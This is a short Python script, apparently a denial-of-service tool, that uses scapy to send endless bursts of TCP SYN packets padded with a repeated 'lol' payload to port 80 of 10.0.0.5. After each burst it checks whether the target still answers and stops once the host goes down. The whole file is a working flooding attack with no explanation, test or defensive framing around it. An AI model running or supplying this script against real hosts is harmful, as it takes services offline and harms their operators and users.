from scapy.all import *

target_ip = "10.0.0.5"

target_port = 80

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

lol = Raw(b"lol"*340)

packet = ip / tcp / lol

while True:
	send(packet,count=1000,verbose=1)
	print("\n### TESTING REACHABILITY ###\n")
	response = sr1(packet, timeout=3)
	#response.summary()
	if response == None:
		print("\nNO RESPONSE. HOST IS DOWN\n")
		break
